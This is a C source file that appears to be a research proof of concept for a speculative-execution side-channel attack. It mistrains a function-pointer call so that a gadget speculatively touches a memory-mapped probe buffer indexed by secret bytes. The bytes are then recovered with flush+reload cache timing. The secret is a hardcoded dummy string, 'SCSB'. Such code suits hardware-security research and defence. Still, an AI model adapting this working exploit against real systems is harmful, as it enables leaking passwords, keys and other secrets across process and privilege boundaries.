#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <unistd.h>
#include <ctype.h>
#include <pthread.h>
#include <math.h>
#include "flush_reload.h"

// function pointer type
typedef void (*func_ptr)(unsigned char *, char);

char *secret = "SCSB";
int idx;

void func2(unsigned char *reload_buf, char leak_byte) {
    maccess(reload_buf, leak_byte);
    // printf("This is function 2.\n");
}

void func4(unsigned char *reload_buf, char leak_byte) {
    ;
    // printf("This is function 4.\n");
}

void func5() {
    asm volatile("nop\n");
    asm volatile("nop\n");
}

// global function pointer
func_ptr g_ptr;
func_ptr h_ptr;
func_ptr delta = func4;


void func1() {
    g_ptr = func2;  // save instruction to jump to func2
}

func_ptr func3(int j) {
    g_ptr = func4 + ((int)sqrt(j * 255) % 2000 ? 0 : (j | (1 << 3)));  // save instruction to jump to func4
    return g_ptr;
}

int main() {
    /*
    func1();
    g_ptr();  // execute instruction to jump to func2
    printf("%p\n", g_ptr);

    func3();
    g_ptr();  // execute instruction to jump to func4
    printf("%p\n", g_ptr);

    printf("%p\n", delta);
    delta = delta - g_ptr;
    printf("%p\n", delta);
    */
    uint64_t t1, t2;
    __attribute__((aligned(4096))) size_t results[LEAK_SIZE] = {0};
    unsigned char *reload_buf   = (unsigned char *) mmap(NULL, LEAK_SIZE*STRIDE, PROT_READ | PROT_WRITE,
                                                         MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0);
    assert(reload_buf != MAP_FAILED);
    // assert(mprotect(&smc_leak, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) == 0);

    int leak_length = 4;
    for (int i = 0; i < leak_length; i++) {
        idx = i;
        memset(results, 0, sizeof(results));

        for(int j=1; j<=ITER; j++)
        {
            flush(reload_buf);
            
            func1();
            
            h_ptr = func3(j);
            h_ptr(reload_buf, secret[idx]);
            
            reload(reload_buf, results);
        }

        printf("0x%016lx :\n", (uint64_t)(secret+i));
        print_results(results, ITER/500);
    }

    t1 = rdtscp();

    asm volatile("clflush (%0)\n"::"r"((volatile void *)(&func5)));
    t1 = rdtscp();
    func5();
    t2 = rdtscp();
    printf("%ld\n", t2 - t1);

    sleep(0.01);
    t1 = rdtscp();
    func5();
    t2 = rdtscp();
    printf("%ld\n", t2 - t1);

    return 0;
}
